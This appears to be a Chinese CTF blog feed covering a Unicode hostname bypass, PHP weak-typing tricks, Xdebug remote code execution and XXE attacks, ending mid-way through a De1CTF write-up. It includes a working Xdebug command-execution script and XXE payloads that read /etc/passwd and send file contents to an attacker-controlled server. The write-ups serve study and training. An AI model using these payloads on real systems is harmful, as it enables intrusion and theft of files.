getUrl(url):    url = url    host = parse.urlparse(url).hostname    if host == &apos;suctf.cc&apos;:        return False    parts = list(urlsplit(url))    host = parts[1]    if host == &apos;suctf.cc&apos;:        return False    newhost = []    for h in host.split(&apos;.&apos;):        newhost.append(h.encode(&apos;idna&apos;).decode(&apos;utf-8&apos;))    parts[1] = &apos;.&apos;.join(newhost)    finalUrl = urlunsplit(parts).split(&apos; &apos;)[0]    host = parse.urlparse(finalUrl).hostname    if host == &apos;suctf.cc&apos;:        return True    else:        return Falseif __name__==&quot;__main__&quot;:    get_unicode()str: �G unicode: \u2105str: �� unicode: \uff23str: �� unicode: \uff43[Finished in 6.5s]</code></pre><p>我们看一下各个判断的结果</p><pre><code>from urllib.parse import urlparse,urlunsplit,urlsplitfrom urllib import parseurl = &apos;http://canada.c℀.microsoft.com/some.txt&apos;parts = parse.urlparse(url)&gt;&gt;&gt; partsParseResult(scheme=&apos;http&apos;, netloc=&apos;canada.c℀.microsoft.com&apos;, path=&apos;/some.txt&apos;, params=&apos;&apos;, query=&apos;&apos;, fragment=&apos;&apos;)&gt;&gt;&gt; host = parts.hostname&gt;&gt;&gt; host&apos;canada.c℀.microsoft.com&apos;&gt;&gt;&gt; parts1 = list(urlsplit(url))&gt;&gt;&gt; parts1[&apos;http&apos;, &apos;canada.c℀.microsoft.com&apos;, &apos;/some.txt&apos;, &apos;&apos;, &apos;&apos;]</code></pre><p>可以看到已经可以绕过判断了</p><h3 id="hosts文件"><a href="#hosts文件" class="headerlink" title="hosts文件"></a>hosts文件</h3><p>Hosts是一个没有扩展名的系统文件，可以用记事本等工具打开，其作用就是将一些常用的网址域名与其对应的IP地址建立一个关联“数据库”，当用户在浏览器中输入一个需要登录的网址时，系统会首先自动从Hosts文件中寻找对应的IP地址，一旦找到，系统会立即打开对应网页，如果没有找到，则系统再会将网址提交DNS域名解析服务器进行IP地址的解析。</p><h3 id="file协议"><a href="#file协议" class="headerlink" title="file协议"></a>file协议</h3><p>中文意思：本地文件传输协议<br>什么是File：File协议主要用于访问本地计算机中的文件，就如同在Windows资源管理器中打开文件一样。<br>如何使用File：要使用File协议，基本的格式如下：file:///文件路径，比如要打开F盘flash文件夹中的1.swf文件，那么可以在资源管理器或浏览器地址栏中输入：file:///f:/flash/1.swf回车。</p><h3 id="nginx配置"><a href="#nginx配置" class="headerlink" title="nginx配置"></a>nginx配置</h3><p> Nginx的配置文件是一个纯文本文件，它一般位于Nginx安装目录的conf目录下，整个配置文件是以block的形式组织的。每个block一般以一个大括号“{”来表示。block 可以分为几个层次，整个配置文件中Main命令位于最高层，在Main层下面可以有Events、 HTTP等层级，而在HTTP层中又包含Server层，即server block, serverblock中又可分为location层，并且一个server block中可以包含多个location block。</p><p>nginx配置文件路径</p><pre><code>[root@localhost vhost]# locate nginx.conf/usr/local/nginx/conf/nginx.conf/usr/local/nginx/conf/nginx.conf.default</code></pre><p>hosts文件绑定本地回环地址，尝试file读文件</p><p><img src="http://wx1.sinaimg.cn/mw690/006boCb9ly1g68vpgbsavj30qj0dq765.jpg" alt="尝试读文件"></p><p>读nginx配置文件</p><p><img src="http://wx3.sinaimg.cn/mw690/006boCb9ly1g68vpjpmkej30oy0cgdh1.jpg" alt="读配置文件"></p><p>读flag</p><p><img src="http://wx4.sinaimg.cn/mw690/006boCb9ly1g68vpmmt76j30ok070dgl.jpg" alt="读flag"></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>black_magic</title>
      <link href="/2019/08/19/Black-magic/"/>
      <url>/2019/08/19/Black-magic/</url>
      
        <content type="html"><![CDATA[<p>别说了，听我的！php is the best language!我不允许你有别的想法！ </p><p>我要我觉得！不要你觉得！</p><a id="more"></a><h1 id="php-弱类型总结"><a href="#php-弱类型总结" class="headerlink" title="php 弱类型总结"></a>php 弱类型总结</h1><h2 id="字符与数字的比较"><a href="#字符与数字的比较" class="headerlink" title="字符与数字的比较"></a>字符与数字的比较</h2><pre><code>&lt;?php$a=1;if($a=TRUE)    echo &quot;1111\n&quot;;if($a=&apos;a&apos;)    echo &quot;1111\n&quot;;结果11111111</code></pre><p>联想到之前P神的文章，<code>TRUE+TRUE=2</code></p><pre><code>$_=(&apos;&gt;&apos;&gt;&apos;&lt;&apos;)+(&apos;&gt;&apos;&gt;&apos;&lt;&apos;);        //2echo $_;$__=$_/$_;                    //1</code></pre><p>来构造数字1和2</p><h2 id="md5比较"><a href="#md5比较" class="headerlink" title="md5比较"></a>md5比较</h2><pre><code>&lt;?phperror_reporting(0); $flag = &apos;233&apos;;//highlight_file(__FILE__);  $md51 = md5(&apos;QNKCDZO&apos;);  //0e830400451993494058024219903391//$a = $_GET[&apos;b&apos;]; $a = &apos;s878926199a&apos;;$md52 = md5($a); if(isset($a)){ if ($a != &apos;QNKCDZO&apos; &amp;&amp; $md51 == $md52) {     echo $flag; } else {     echo &quot;false!!!&quot;;     }}</code></pre><p>php在进行 <code>==</code> 比较的时候会认为该字符串是科学记数法表示的数字，<code>QNKCDZO</code> MD5值是<code>0e</code>开头，我们也找到一个MD5后<code>0e</code>开头的这样两个字符串都转换为数字0，这样就弱比较相等，但是如果是 <code>===</code> 就不行了。</p><p> === 在进行比较的时候会判断两种字符串的类型是否相等再比较。</p><p> == 在进行比较的时候会将字符串类型转换相同，再比较。如果比较一个数字和字符串或者涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行。</p><pre><code>var_dump(&apos;admin&apos;==0);var_dump(&apos;1admin&apos;==1);var_dump(&quot;admin1&quot;==1);var_dump(&quot;admin1&quot;==0);var_dump(&quot;0e123345&quot;==&quot;0e3455436&quot;);bool(true)bool(true)bool(false)bool(true)bool(true)</code></pre><p>例如<br>        <?php        $a=$_GET['a'];        if ($a==0) {        echo "1";        }        if ($a) {        echo "must";        }        ?></p><p>我们传入<code>?a=a1</code>即可</p><p>一些MD5后0e开头的例子</p><pre><code>s878926199a0e545993274517709034328855841020s155964671a0e342768416822451524974117254469s214587387a0e848240448830537924465865611904s214587387a0e848240448830537924465865611904</code></pre><p>json-decode</p><pre><code>&lt;?phpif (isset($_POST[&apos;message&apos;])) {    $message = json_decode($_POST[&apos;message&apos;]);    $key =&quot;*********&quot;;    if ($message-&gt;key == $key) {        echo &quot;flag&quot;;        }     else {        echo &quot;fail&quot;;        }     }     else{         echo &quot;~~~~&quot;; }</code></pre><p>我们利用 0 = admin 的特性传入 <code>$message = {&quot;key&quot;:0}</code></p><h2 id="当MD5与SHA1碰上数组"><a href="#当MD5与SHA1碰上数组" class="headerlink" title="当MD5与SHA1碰上数组"></a>当MD5与SHA1碰上数组</h2><pre><code>$a = [1];var_dump(MD5($a));var_dump(sha1($a));NULLNULL</code></pre><p>他俩碰到数组就会转换成<code>NULL</code></p><h2 id="intval"><a href="#intval" class="headerlink" title="intval()"></a>intval()</h2><pre><code>&lt;?php var_dump(intval(&apos;2&apos;));            //2var_dump(intval(&apos;3abcd&apos;));        //3    var_dump(intval(&apos;abcd&apos;));        //0var_dump(intval([]));            //0    var_dump(intval([&apos;a&apos;]));        //1 ?&gt;</code></pre><p>利用intval()进行进制转换(默认是10进制)碰到头开始直到遇到一个非数字的字符。即使出现无法转换的字符串也不会报错而是返回0.碰到空数组返回0，非空返回1.</p><p>可返回的最大值却决于操作系统，32 位系统最大带符号的 <code>integer</code> 范围是 <code>-2147483648</code> 到 <code>2147483647</code>。</p><pre><code>var_dump(intval(&apos;10000000000000000&apos;));   //int(2147483647)</code></pre><h2 id="strcmp"><a href="#strcmp" class="headerlink" title="strcmp"></a>strcmp</h2><blockquote><p>strcmp — 二进制安全字符串比较<br>如果 str1 小于 str2 返回 &lt; 0；如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。</p></blockquote><pre><code>$password=$_GET[&apos;password&apos;];if(strcmp(&apos;am0s&apos;,$password)){    echo &apos;false!&apos;;}else{    echo &apos;success!&apos;;}</code></pre><p>我们传入<code>password[]=1</code>来绕过。</p><h2 id="is-numeric"><a href="#is-numeric" class="headerlink" title="is_numeric"></a>is_numeric</h2><p>当有两个<code>is_numeric</code>判断并用<code>and</code>连接时<code>and</code>后面的<code>is_numeric</code>可以绕过</p><blockquote><p>is_numeric — 检测变量是否为数字或数字字符串<br>如果 var 是数字和数字字符串则返回 TRUE，否则返回 FALSE</p></blockquote><pre><code>var_dump(is_numeric(&apos; 45&apos;));   //bool(true)var_dump(is_numeric(&apos;45 &apos;));   //bool(false)</code></pre><p>忽略前面的空格，不忽略后面的空格。</p><pre><code>$a=&apos; 1&apos;;$b=&apos;abc&apos;;$c=is_numeric($a) and is_numeric($b);var_dump(is_numeric($a));            //bool(true)var_dump(is_numeric($b));            //bool(false)var_dump($c);  //$b可以不是数字，同样返回truevar_dump(is_numeric(&apos;123E123&apos;));    //bool(true) 小写也可以var_dump(is_numeric(&apos;+123e123&apos;));    //bool(true)    </code></pre><h2 id="与false比较"><a href="#与false比较" class="headerlink" title="与false比较"></a>与false比较</h2><pre><code>var_dump(null==false);        //bool(true)var_dump(0==false);            //bool(true)    var_dump(&apos;0&apos;==false);        //bool(true)$a[] = array(&apos; &apos; =&gt; &apos;&apos;,);var_dump($a[1] == false);        //bool(true)?&gt;</code></pre><h2 id="ereg"><a href="#ereg" class="headerlink" title="ereg"></a>ereg</h2><blockquote><p>ereg — 正则表达式匹配<br>以区分大小写的方式在 string 中寻找与给定的正则表达式 pattern 所匹配的子串。 如果找到与 pattern 中圆括号内的子模式相匹配的子串并且函数调用给出了第三个参数 regs，则匹配项将被存入 regs 数组中。$regs[1] 包含第一个左圆括号开始的子串，$regs[2] 包含第二个子串，以此类推。$regs[0] 包含整个匹配的字符串。 </p></blockquote><p>字符串对比解析，ereg函数存在NULL截断漏洞，当ereg读取字符串string时,如果遇到了%00,后面的字符串就不会被解析。</p><pre><code>$a = &quot;djasodja%0091&quot;;$b[] =  array(&apos;a&apos; =&gt; &apos;abcpd&apos;, );var_dump(ereg(&apos;([1-9])&apos;, $a));            //int(1)var_dump(ereg(&apos;pd&apos;, $b));                //NULL</code></pre><h2 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h2><blockquote><p>switch 语句类似于具有同一个表达式的一系列 if 语句。很多场合下需要把同一个变量（或表达式）与很多不同的值比较，并根据它等于哪个值来执行不同的代码。这正是 switch 语句的<br>用途.<br> 注意和其它语言不同，continue 语句作用到 switch 上的作用类似于 break。如果在循环中有一个 switch 并希望 continue 到外层循环中的下一轮循环，用 continue 2。<br> switch 语句一行接一行地执行（实际上是语句接语句）。开始时没有代码被执行。仅当一个 case 语句中的值和 switch 表达式的值匹配时 PHP 才开始执行语句，直到 switch 的程序段结束或者遇到第一个 break 语句为止。如果不在 case 的语句段最后写上 break 的话，PHP 将继续执行下一个 case 中的语句段.</p></blockquote><pre><code>&lt;?phpswitch (true) {    //弱类型    case 0:        echo &quot;0&quot;;        break;    case 1:        echo &quot;1&quot;;        break;    case 2:        echo &quot;2&quot;;        break;}//1?&gt;&lt;?phpswitch (0) {    case 0:        echo &quot;i equals 0&quot;;    case 1:        echo &quot;i equals 1&quot;;    case 2:        echo &quot;i equals 2&quot;;}//i equals 0    i equals 1    i equals 2?&gt; &lt;?phpswitch (&apos;a&apos;) {  // null、false    case 0:        echo &quot;0&quot;;        break;    case 1:        echo &quot;1&quot;;        break;    case 2:        echo &quot;2&quot;;        break;}//输出 0?&gt;</code></pre><h2 id="strpos"><a href="#strpos" class="headerlink" title="strpos"></a>strpos</h2><blockquote><p>strpos — 查找字符串首次出现的位置</p><p>int strpos( string $haystack, mixed $needle[, int $offset = 0] )<br>返回 needle 在 haystack 中首次出现的数字位置。</p><p>haystack<br>在该字符串中进行查找。 </p><p>needle<br>如果 needle 不是一个字符串，那么它将被转换为整型并被视为字符的顺序值。 </p><p>offset<br>如果提供了此参数，搜索会从字符串该字符数的起始位置开始统计。如果是负数，搜索会从字符串结尾指定字符数开始。<br>返回 needle 存在于 haystack 字符串起始的位置(独立于 offset)。同时注意字符串位置是从0开始，而不是从1开始的。<br>如果没找到 needle，将返回 FALSE。 </p><p>7.1.0 开始支持负数的 offset。  </p></blockquote><p>处理数组返回NULL</p><h2 id="array-search"><a href="#array-search" class="headerlink" title="array_search"></a>array_search</h2><blockquote><p>array_search — 在数组中搜索给定的值，如果成功则返回首个相应的键名</p><p>mixed array_search( mixed $needle, array $haystack[, bool $strict = false] )</p><p>大海捞针，在大海（haystack）中搜索针（ needle 参数）。</p><p>needle<br>搜索的值。<br>Note:<br>如果 needle 是字符串，则比较以区分大小写的方式进行。</p><p>haystack<br>这个数组。 </p><p>strict<br>如果可选的第三个参数 strict 为 TRUE，则 array_search() 将在 haystack 中检查完全相同的元素。这意味着同样严格比较 haystack 里 needle 的 类型，并且对象需是同一个实例。<br>如果找到了 needle 则返回它的键，否则返回 FALSE。 </p><p>如果 needle 在 haystack 中出现不止一次，则返回第一个匹配的键。要返回所有匹配值的键，应该用 array_keys() 加上可选参数 search_value 来代替。</p></blockquote><pre><code>&lt;?phpif(!is_array($_GET[&apos;test&apos;])){exit();}$test=$_GET[&apos;test&apos;];for($i=0;$i&lt;count($test);$i++){    if($test[$i]===&quot;admin&quot;){        echo &quot;error&quot;;        exit();    }    $test[$i]=intval($test[$i]);}if(array_search(&quot;admin&quot;,$test)===0){    echo &quot;flag&quot;;}else{    echo &quot;false&quot;;}?&gt;</code></pre><p>我们使用<code>test[]=0</code>来绕过。如果第三个参数设置为<code>TRUE</code>，进行严格过滤就不能绕过。</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> 弱类型 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Xdebug</title>
      <link href="/2019/08/17/Xdebug/"/>
      <url>/2019/08/17/Xdebug/</url>
      
        <content type="html"><![CDATA[<p>你从未见过的船新知识点</p><a id="more"></a><h1 id="Xdebug"><a href="#Xdebug" class="headerlink" title="Xdebug"></a>Xdebug</h1><p>如何确定开启动态调试？</p><p>在vps上监听9000端口  <code>nc -l -vv -p 9000</code></p><p>再打开一个窗口执行 <code>curl &#39;http://TARGET_IP/index.php?XDEBUG_SESSION_START=phpstrom&#39; -H &quot;X-Forwarded-For: VPS_IP&quot;</code></p><p>如果此时监听窗口收到返回的xml数据则证明开启了动态调试。</p><h2 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用?"></a>如何利用?</h2><p>Ricterz师傅写好了exp:</p><pre><code>#!/usr/bin/python2import socketip_port = (&apos;0.0.0.0&apos;,9000)sk = socket.socket()sk.bind(ip_port)sk.listen(10)conn, addr = sk.accept()while True:    client_data = conn.recv(1024)    print(client_data)    data = raw_input(&apos;&gt;&gt; &apos;)    conn.sendall(&apos;eval -i 1 -- %s\x00&apos; % data.encode(&apos;base64&apos;))</code></pre><p>在vps上执行脚本，然后执行上文的curl代码触发Xdebug即可任意命令执行</p><p>我们首先<code>system(&#39;find /|grep flag&#39;)</code> 找一下flag在哪，然后读取</p><pre><code>system(&apos;cat /home/flag.txt&apos;)</code></pre><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote><p><a href="http://0sec.com.cn/2018-05-10/" target="_blank" rel="noopener">http://0sec.com.cn/2018-05-10/</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Xdebuf </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xxe</title>
      <link href="/2019/08/17/xxe/"/>
      <url>/2019/08/17/xxe/</url>
      
        <content type="html"><![CDATA[<p>一次简单的xxe学习~</p><a id="more"></a><h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><h2 id="定义实体"><a href="#定义实体" class="headerlink" title="定义实体"></a>定义实体</h2><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe &quot;test&quot; &gt;]&gt;</code></pre><p>定义ANY说明接受任何元素，定义了了一个XML实体xxe，我们可以通过&amp;进行引用。XML可以写成这样，我们输出的结果中xxe被替换成了test</p><pre><code>&lt;creds&gt;&lt;user&gt;&amp;xxe;&lt;/user&gt;&lt;pass&gt;mypass&lt;/pass&gt;&lt;/creds&gt;</code></pre><h2 id="实体引用"><a href="#实体引用" class="headerlink" title="实体引用"></a>实体引用</h2><pre><code>&amp;lt;    &lt;    小于号&amp;gt;    &gt;    大于号&amp;amp;    &amp;    和号&amp;apos;    &apos;    单引号&amp;quot;    &quot;    引号 </code></pre><h2 id="DTD-document-type-definition-文档类型定义"><a href="#DTD-document-type-definition-文档类型定义" class="headerlink" title="DTD(document type definition 文档类型定义)"></a>DTD(document type definition 文档类型定义)</h2><p>自定义XML文档的合法构建模块，可以在XML内部声明也可以外部引用。</p><p><code>SYSTEM</code> 外部引用文件<br>    <!DOCTYPE note SYSTEM "XXX.XX"></p><p>内部实体声明</p><pre><code>&lt;!ENTITY entity-name &quot;entity-value&quot;&gt;&lt;?xml version=&apos;1.0&apos;?&gt;&lt;!DOCTYPE mail[&lt;!ELEMENT mail (message)&gt;&lt;!ENTITY hacker &quot;hacker&apos;s data&quot;&gt;]&gt;&lt;mail&gt;    &lt;message&gt;&amp;hacker;&lt;/message&gt;&lt;/mail&gt;</code></pre><p>外部实体声明</p><pre><code>&lt;?xml version=&apos;1.0&apos;?&gt;&lt;!DOCTYPE mail[&lt;!ELEMENT mail (message)&gt;&lt;!--ENTITY hacker &quot;hacker&apos;s data&quot;--&gt;&lt;!ENTITY hacker SYSTEM &quot;file:///C:/Windows/win.ini&quot;&gt;]&gt;&lt;mail&gt;    &lt;message&gt;&amp;hacker;&lt;/message&gt;&lt;/mail&gt;</code></pre><p>当然我们也可以引用公用DTD，语法如下</p><pre><code>&lt;!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”&gt;</code></pre><p>起和SYSTEM一样的作用</p><h2 id="外部声明默认协议"><a href="#外部声明默认协议" class="headerlink" title="外部声明默认协议"></a>外部声明默认协议</h2><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002647-e93bbf00-ec17-1.png" alt></p><h2 id="通用实体与参数实体"><a href="#通用实体与参数实体" class="headerlink" title="通用实体与参数实体"></a>通用实体与参数实体</h2><p>只能用在DTD和文档的内部子集中</p><p><strong>通用实体</strong> <code>&amp;name;</code> 在DTD中定义，在XML中引用，如上文的示例代码。</p><p><strong>参数实体</strong></p><ol><li>使用 <code>% name</code> 在DTD中定义，并且只能在DTD中使用<code>%name</code>引用</li><li>只有在DTD文件中，参数实体的声明才能引用其他实体</li><li>参数实体也可以外部引用。</li></ol><h2 id="有回显读本地敏感文件"><a href="#有回显读本地敏感文件" class="headerlink" title="有回显读本地敏感文件"></a>有回显读本地敏感文件</h2><p>本地服务器解析代码</p><pre><code>&lt;?php    libxml_disable_entity_loader (false);    $xmlfile = file_get_contents(&apos;php://input&apos;);    $dom = new DOMDocument();    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);     $creds = simplexml_import_dom($dom);    echo $creds;?&gt;</code></pre><p>payload</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE creds [  &lt;!ENTITY goodies SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt; ]&gt; &lt;creds&gt;&amp;goodies;&lt;/creds&gt;</code></pre><p>成功读取到敏感文件，但是如果我们的目标文件包含特殊符号时XML解释器会生成错误，我们这样做就会报错，此时我们就使用 <code>&lt;![CDATA[</code>在参数实体中进行。</p><p>payload</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE roottag [&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;   &lt;!ENTITY % goodies SYSTEM &quot;file:///d:/test.txt&quot;&gt;  &lt;!ENTITY % end &quot;]]&gt;&quot;&gt;  &lt;!ENTITY % dtd SYSTEM &quot;http://ip/evil.dtd&quot;&gt; %dtd; ]&gt; &lt;roottag&gt;&amp;all;&lt;/roottag&gt;</code></pre><p>evil.dtd</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;</code></pre><p>also,we can read the file just bs64-encode</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;     &lt;!DOCTYPE creds [      &lt;!ENTITY goodies SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///D:/test.txt&quot;&gt; ]&gt;     &lt;creds&gt;&amp;goodies;&lt;/creds&gt;</code></pre><p>这样就算有特殊字符也不怕啦！</p><h2 id="无回显读取本地敏感文件-Blind-OOB-XXE"><a href="#无回显读取本地敏感文件-Blind-OOB-XXE" class="headerlink" title="无回显读取本地敏感文件(Blind OOB XXE)"></a>无回显读取本地敏感文件(Blind OOB XXE)</h2><p>外部实体可以通过请求内部文件uri获得文件内容，那我们可以通过写两个外部参数实体来请求自己的服务器将文件内容发送到我们的服务器上</p><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [    &lt;!ENTITY % files SYSTEM &quot;file:///etc/passwd&quot;&gt;      &lt;!ENTITY % send SYSTEM &quot;http://myip/?a=%files;&quot;&gt;     %send;]&gt;</code></pre><p>但是这样是不行的，几乎所有的XML解析器都不会解析同级参数实体的内容。</p><p>如果我们进行嵌套操作呢？</p><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [    &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;      &lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &apos;http://myip/?%file;&apos;&gt;&quot;&gt;    %start;    %send;]&gt;</code></pre><p>会报错 <code>PEReferences forbidden in internal subset in Entity</code>。禁止在内部实体引用参数实体。基于此我们采用引入外部DTD，在自己的服务器上加入DTD文件</p><p>xml.php</p><pre><code>&lt;?phplibxml_disable_entity_loader (false);$xmlfile = file_get_contents(&apos;php://input&apos;);$dom = new DOMDocument();$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); //loadXML() 方法通过解析一个 XML 标签字符串来组成该文档。?&gt;</code></pre><p>test.dtd</p><pre><code>&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///D:/test.txt&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37 send SYSTEM &apos;http://ip:9999?p=%file;&apos;&gt;&quot;&gt;</code></pre><p>payload</p><pre><code>&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM &quot;http://ip/test.dtd&quot;&gt;%remote;%int;%send;]&gt;</code></pre><p>在payload的最后我们连续调用了三个参数实体<code>%remote;%int;%send;</code>，这就是我们的利用顺序。<code>%remote</code>先告诉解释器请求远程URL的<code>test.dtd</code>，随后<code>%int</code>调用参数实体中的<code>$file</code>，这将请求test.txt的内容并将其编码，最后调用<code>%send</code>将数据发送到vps上。</p><h2 id="Exploiting-XXE-with-local-DTD-files"><a href="#Exploiting-XXE-with-local-DTD-files" class="headerlink" title="Exploiting XXE with local DTD files"></a>Exploiting XXE with local DTD files</h2><p>8/30/2019 10:47:36 AM </p><p>在Ogeak-ctf里碰上一道xxe的题，<a href="http://47.107.253.140:18080/webserver/" title="题目链接" target="_blank" rel="noopener">http://47.107.253.140:18080/webserver/</a></p><p>在源码里找到一段奇怪的JS</p><pre><code>var data = &quot;&lt;?xml version=\&quot;1.0\&quot; ?&gt;\n&lt;request&gt;\n    &lt;status&gt;1&lt;/status&gt;\n&lt;/request&gt;&quot;;setInterval(function(){    $.post(&quot;callback&quot;, data);}, 10000);</code></pre><p>当时看不懂这是干嘛的，因为也有事也就没做了。事后再看这段代码发现是一个定时函数，每10秒post一个xml实体。我们抓包看一下</p><p>在实体部分找上文的最简单的例子，不包含任何读文件的代码试一下发现返回<code>200</code>，内容异常返回<code>500</code>.</p><p>听大佬说是屏蔽了外网，不允许我们请求外网服务器，只能利用本地DTD了。</p><p>原理看<a href="https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/" title="这里" target="_blank" rel="noopener">https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/</a></p><p>读完大意就是如果我们找到了一个内部的DTD，我们可以强制在目标主机上调用这个本地dtd文件，在这个文件中重写上一步我们在内部DTD中找到的参数。如果我们定义了两个同名实体，只有第一个会被执行。于是我们可以利用重写的本地DTD文件触发报错来读我们的目标文件内容。</p><p>like this</p><pre><code>Request&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE message [    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///opt/IBM/WebSphere/AppServer/properties/sip-app_1_0.dtd&quot;&gt;    &lt;!ENTITY % condition &apos;aaa)&gt;        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;        &amp;#x25;eval;        &amp;#x25;error;        &lt;!ELEMENT aa (bb&apos;&gt;    %local_dtd;]&gt;&lt;message&gt;any text&lt;/message&gt;    Responsejava.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/usr/bin/nologindaemon:x:2:2:daemon:/:/usr/bin/nologin(No such file or directory)</code></pre><p>Contents of sip-app_1_0.dtd</p><pre><code>…&lt;!ENTITY % condition &quot;and | or | not | equal | contains | exists | subdomain-of&quot;&gt;&lt;!ELEMENT pattern (%condition;)&gt;…</code></pre><p>这里使用三层的实体嵌套，第二层中我们给定义参数实体的<code>%</code>进行编码，第三层中对<code>空格</code>,<code>&#39;</code>,<code>&quot;</code>,<code>&amp;</code>,<code>%</code>都进行了编码。代码里先调用<code>%local_dtd</code>，然后在对应的dtd文件中调用了<code>% condition</code>,在<code>condition</code>定义的实体中调用<code>eval</code>和<code>error</code>。在<code>error</code>的最后我们调用<code>%file</code>来获取文件内容。为什么不使用两层嵌套的原因是会报错<code>PEReferences forbidden in internal subset in Entity</code>指的是参数实体引用(Parameter Entity Reference)，禁止在内部Entity中引用参数实体。</p><p>于是我们<a href="https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation" title="依据此" target="_blank" rel="noopener">依据此</a>找到一个dtd文件来利用，这个<code>fonts.dtd</code>刚好是<code>tomcat:8-jre8</code> 里有的</p><pre><code>&lt;!DOCTYPE message [    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/xml/fontconfig/fonts.dtd&quot;&gt;    &lt;!ENTITY % expr &apos;aaa)&gt;        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///flag&quot;&gt;        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///abcxyz/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;        &amp;#x25;eval;        &amp;#x25;error;        &lt;!ELEMENT aa (bb&apos;&gt;    %local_dtd;]&gt;&lt;message&gt;&lt;/message&gt;</code></pre><p>于是我们通过构造一个错误的url将数据带出，通过报错信息得到了flag</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote><p><a href="https://xz.aliyun.com/t/3357#toc-8" target="_blank" rel="noopener">https://xz.aliyun.com/t/3357#toc-8</a><br><a href="https://www.freebuf.com/vuls/207639.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/207639.html</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xxe </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>De1ctf</title>
      <link href="/2019/08/16/De1ctf/"/>
      <url>/2019/08/16/De1ctf/</url>
      
        <content type="html"><![CDATA[<p>这次比赛真的超有意思的！我超级喜欢的！做了半天啥都没做出来，看着那个樱花🌸全程陶醉~</p><a id="more"></a><h1 id="De1ctf-2019-WP"><a href="#De1ctf-2019-WP" class="headerlink" title="De1ctf 2019 WP"></a>De1ctf 2019 WP</h1><h2 id="ssrfme"><a href="#ssrfme" class="headerlink" title="ssrfme"></a>ssrfme</h2><p>源码 </p><pre><code>#! /usr/bin/env python#encoding=utf-8from flask import Flaskfrom flask import requestimport socketimport hashlibimport urllibimport sysimport osimport jsonreload(sys)sys.setdefaultencoding(&apos;latin1&apos;)app = Flask(__name__)secert_key = os.urandom(16)class Task:    def __init__(self, action, param, sign, ip):        self.action = action        self.param = param        self.sign = sign        self.sandbox = md5(ip)        if(not os.path.exists(self.sandbox)):          #SandBox For Remote_Addr            os.mkdir(self.sandbox)    def Exec(self):        result = {}        result[&apos;code&apos;] = 500        if (self.checkSign()):            if &quot;scan&quot; in self.action:                tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &apos;w&apos;)                resp = scan(self.param)                if (resp == &quot;Connection Timeout&quot;):                    result[&apos;data&apos;] = resp                else:                    print resp                    tmpfile.write(resp)                    tmpfile.close()                result[&apos;code&apos;] = 200            if &quot;read&quot; in self.action:                f = open(&quot;./%s/result.txt&quot; % self.sandbox, &apos;r&apos;)                result[&apos;code&apos;] = 200                